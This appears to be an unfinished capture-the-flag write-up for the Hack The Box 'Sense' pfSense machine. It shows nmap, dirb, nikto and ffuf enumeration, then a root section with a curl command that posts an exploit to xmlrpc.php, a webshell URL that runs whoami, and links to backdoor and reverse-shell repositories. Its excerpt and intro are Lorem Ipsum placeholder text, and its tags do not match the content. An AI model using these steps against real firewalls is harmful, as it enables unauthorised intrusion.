---
layout: single
title: Sense - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-07
classes: wide
header:
  teaser: /assets/images/htb-writeup-sense/sense_logo.png
  teaser_home_page: true
  icon: /assets/images/freebsd.png
categories:
  - hackthebox
  - infosec
tags:  
  - freebsd
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-sense/sense_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/sense]# nmap -Pn -n -sCV 10.10.10.60 --open                                                                        (master✱)
    PORT    STATE SERVICE    VERSION
    80/tcp  open  http       lighttpd 1.4.35
    |_http-server-header: lighttpd/1.4.35
    |_http-title: Did not follow redirect to https://10.10.10.60/
    443/tcp open  ssl/https?
    | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
    | Not valid before: 2017-10-14T19:21:35
    |_Not valid after:  2023-04-06T19:21:35
    |_ssl-date: TLS randomness does not represent time

  DIRB:
  ==> DIRECTORY: https://10.10.10.60/classes/
  ==> DIRECTORY: https://10.10.10.60/css/
  + https://10.10.10.60/favicon.ico (CODE:200|SIZE:1406)
  ==> DIRECTORY: https://10.10.10.60/includes/
  + https://10.10.10.60/index.html (CODE:200|SIZE:329)
  + https://10.10.10.60/index.php (CODE:200|SIZE:6690)
  ==> DIRECTORY: https://10.10.10.60/installer/
  ==> DIRECTORY: https://10.10.10.60/javascript/
  ==> DIRECTORY: https://10.10.10.60/themes/
  ==> DIRECTORY: https://10.10.10.60/tree/
  ==> DIRECTORY: https://10.10.10.60/widgets/
  + https://10.10.10.60/xmlrpc.php (CODE:200|SIZE:384)

  NIKTO:
  + Cookie cookie_test created without the secure flag
  + Cookie cookie_test created without the httponly flag
  + Multiple index files found: /index.php, /index.html
  + Hostname '10.10.10.60' does not match certificate's names: Common
  + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST


2. Check the pages to see what we have to work with;

  https://10.10.10.60/index.php is a login page to a pfsense firewall.
  https://10.10.10.60/xmlrpc.php is used by pfsense, and is vital from privilege escallation.

  https://10.10.10.60/tree/ is running SilverStripe Tree Control: v0.1, 30 Oct 2005. Sounds old and probably have some vulns.

  We are unable to do anything with the info we've found. So take one step back and start to fuzz.


3. Fuzzing!

    root@nidus:/srv/pub-share# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u https://sense.htb/FUZZ.txt
      --- snip ---
      changelog               [Status: 200, Size: 271, Words: 35, Lines: 10]

    [root:/git/htb/sense]# curl -k https://sense.htb/changelog.txt                                                                  (master✱)
      # Security Changelog

      ### Issue
      There was a failure in updating the firewall. Manual patching is therefore required

      ### Mitigated
      2 of 3 vulnerabilities have been patched.

      ### Timeline
      The remaining patches will be installed during the next maintenance window#

  The unpatched vuln they mention above, is hopefully the xmlrpc RCE. However this doesn't really help right now - so continue to fuzz.




██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1.


https://github.com/chadillac/pfsense_xmlrpc_backdoor
[root:/git/htb/sense]# curl -k --data @pfsense_exec https://10.10.10.60/xmlrpc.php
https://10.10.10.60/ignore.php?cmd=whoami

https://github.com/spencerdodd/pfsense-code-exec    <-- full RCE rev shell.

██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
